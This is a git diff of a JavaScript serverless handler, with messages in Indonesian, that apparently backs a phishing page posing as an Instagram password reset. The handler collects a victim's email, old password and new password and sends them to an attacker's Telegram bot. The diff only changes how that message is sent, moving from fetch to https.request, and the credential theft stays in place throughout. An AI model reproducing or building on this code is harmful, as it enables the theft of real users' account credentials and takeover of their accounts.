@@ -1,4 +1,9 @@
-export default async function handler(req, res) {
+import https from 'https';
+import { config } from 'dotenv';
+
+config();
+
+export default function handler(req, res) {
   if (req.method !== 'POST') {
     return res.status(405).json({ message: 'Metode tidak diizinkan' });
   }
@@ -13,39 +18,49 @@ export default async function handler(req, res) {
   const chatId = process.env.CHAT_ID;
 
   if (!botToken || !chatId) {
-    return res.status(500).json({ message: 'Konfigurasi tidak tersedia (env error)' });
+    return res.status(500).json({ message: 'Konfigurasi tidak ditemukan' });
   }
 
-  const text = `
-🔐 Reset Password Instagram
------------------------------
-📧 Email: ${email}
-🔑 Password Lama: ${oldPass}
-🆕 Password Baru: ${newPass}
-🕒 Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
-`;
+  const message = `
+🔐 *Reset Password Instagram*
+👤 Email: \`${email}\`
+🔑 Password Lama: \`${oldPass}\`
+🆕 Password Baru: \`${newPass}\`
+  `.trim();
 
-  try {
-    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const response = await fetch(telegramUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: text.trim(),
-        parse_mode: 'HTML' // Bisa 'Markdown' juga kalau perlu
-      })
-    });
+  const data = JSON.stringify({
+    chat_id: chatId,
+    text: message,
+    parse_mode: 'Markdown'
+  });
 
-    const result = await response.json();
-
-    if (!response.ok) {
-      return res.status(500).json({ message: 'Gagal mengirim ke Telegram', error: result });
+  const options = {
+    hostname: 'api.telegram.org',
+    path: `/bot${botToken}/sendMessage`,
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Content-Length': data.length
     }
+  };
 
-    return res.status(200).json({ success: true });
-  } catch (err) {
-    console.error(err);
-    return res.status(500).json({ message: 'Terjadi kesalahan', error: err.message });
-  }
+  const telegramReq = https.request(options, (telegramRes) => {
+    let body = '';
+    telegramRes.on('data', (chunk) => (body += chunk));
+    telegramRes.on('end', () => {
+      if (telegramRes.statusCode === 200) {
+        res.status(200).json({ message: 'Berhasil' });
+      } else {
+        res.status(500).json({ message: 'Gagal mengirim ke Telegram' });
+      }
+    });
+  });
+
+  telegramReq.on('error', (e) => {
+    console.error('Telegram Error:', e);
+    res.status(500).json({ message: 'Gagal mengirim ke Telegram' });
+  });
+
+  telegramReq.write(data);
+  telegramReq.end();
 }
